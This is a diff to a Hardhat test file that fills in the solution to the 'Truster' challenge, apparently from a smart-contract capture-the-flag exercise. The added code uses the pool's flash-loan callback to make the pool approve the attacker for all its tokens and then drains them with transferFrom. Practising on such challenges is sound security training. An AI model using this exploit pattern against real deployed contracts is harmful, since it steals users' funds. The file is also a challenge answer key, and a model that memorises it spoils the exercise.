@@ -1,6 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
+
 describe('[Challenge] Truster', function () {
     let deployer, attacker;
 
@@ -29,6 +30,12 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        let ABI = ["function approve(address receiver,uint256 amount)"];
+        let interface = new ethers.utils.Interface(ABI);
+        let approveData = await interface.encodeFunctionData("approve", [attacker.address, TOKENS_IN_POOL.toString()]);
+
+        await this.pool.connect(attacker).flashLoan(0, attacker.address, this.token.address, approveData);
+        await this.token.connect(attacker).transferFrom(this.pool.address, attacker.address, TOKENS_IN_POOL);
     });
 
     after(async function () {
